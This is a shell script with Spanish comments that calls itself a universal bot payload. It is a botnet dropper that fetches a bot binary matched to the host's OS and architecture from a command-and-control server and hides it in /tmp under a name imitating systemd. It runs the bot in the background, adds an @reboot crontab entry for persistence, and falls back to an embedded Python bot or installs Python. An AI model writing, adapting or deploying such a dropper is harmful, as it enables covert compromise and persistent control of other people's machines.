#!/bin/sh
# Universal bot payload - NO requiere Python

# Detectar sistema y arquitectura
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)

# URL del servidor C2
C2_SERVER="YOUR_SERVER_IP:8000"

# Intentar descargar binario apropiado
BOT_NAME=".systemd-${OS}-${ARCH}"
DOWNLOAD_URL="http://${C2_SERVER}/bots/${OS}/${ARCH}/bot"

cd /tmp

# Intentar con curl o wget
if command -v curl >/dev/null 2>&1; then
    curl -s -o "${BOT_NAME}" "${DOWNLOAD_URL}"
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "${BOT_NAME}" "${DOWNLOAD_URL}"
else
    # Fallback: usar script Python embebido
    if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
        PYTHON_CMD=$(command -v python3 || command -v python)
        
        # Descargar bot Python
        cat > "${BOT_NAME}.py" << 'EOFPYTHON'
# Bot Python embebido aquí
import socket, ssl, json, time
# ... código minimizado del bot ...
EOFPYTHON
        
        nohup ${PYTHON_CMD} "${BOT_NAME}.py" >/dev/null 2>&1 &
        exit 0
    fi
fi

# Si descargó el binario, ejecutarlo
if [ -f "${BOT_NAME}" ]; then
    chmod +x "${BOT_NAME}"
    
    # Intentar ejecutar
    nohup "./${BOT_NAME}" >/dev/null 2>&1 &
    
    # Verificar que está corriendo
    sleep 2
    if ps aux | grep -q "[.]${BOT_NAME}"; then
        # Agregar persistencia
        (crontab -l 2>/dev/null; echo "@reboot /tmp/${BOT_NAME}") | crontab - 2>/dev/null
        echo "Bot deployed successfully"
        exit 0
    fi
fi

# Si todo falla, instalar Python y reintentar
if command -v apt-get >/dev/null 2>&1; then
    apt-get update -qq && apt-get install -y python3 python3-pip
elif command -v yum >/dev/null 2>&1; then
    yum install -y python3 python3-pip
fi

# Reintentar descarga de script Python
# ... código de fallback ...

exit 1
